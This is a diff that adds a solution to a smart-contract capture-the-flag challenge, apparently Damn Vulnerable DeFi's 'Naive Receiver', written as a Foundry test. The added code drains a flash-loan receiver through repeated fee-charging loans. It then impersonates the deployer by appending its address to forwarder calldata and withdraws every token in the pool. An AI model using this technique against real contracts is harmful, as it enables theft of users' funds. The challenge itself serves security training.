@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -77,7 +78,45 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        bytes[] memory data = new bytes[](11);
+
+        // Move the 10 ETH from receiver to the pool
+        bytes memory drainReceiverCall = abi.encodeCall(pool.flashLoan, (receiver, address(weth), 1 ether, bytes("")));
+        for (uint256 i = 0; i < 10; ++i) {
+            data[i] = drainReceiverCall;
+        }
+
+        // deployer == feeRecipient
+        // At this point all the funds will be under deposits(deployer)
+        uint256 total = WETH_IN_POOL + WETH_IN_RECEIVER;
+        bytes memory drainPoolCall = abi.encodePacked(
+            abi.encodeCall(pool.withdraw, (total, payable(player))),
+            deployer // impersonate the deployer by adding the address the last 20 bytes the of calldata
+        );
+
+        data[10] = drainPoolCall;
+
+        BasicForwarder.Request memory request = BasicForwarder.Request(
+            player, // from
+            address(pool), // target
+            0, // value
+            1_000_000, // gas (pass 1M just for test)
+            forwarder.nonces(deployer), // nonce
+            abi.encodeCall(pool.multicall, (data)), // data
+            block.timestamp
+        );
+
+        bytes32 digest = forwarder.getDataHash(request);
+        bytes32 domainSeparator = forwarder.domainSeparator();
+
+        bytes32 digestHash = keccak256(abi.encodePacked("\x19\x01", domainSeparator, digest));
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        require(forwarder.execute(request, signature));
+
+        require(weth.transfer(recovery, total));
     }
 
     /**
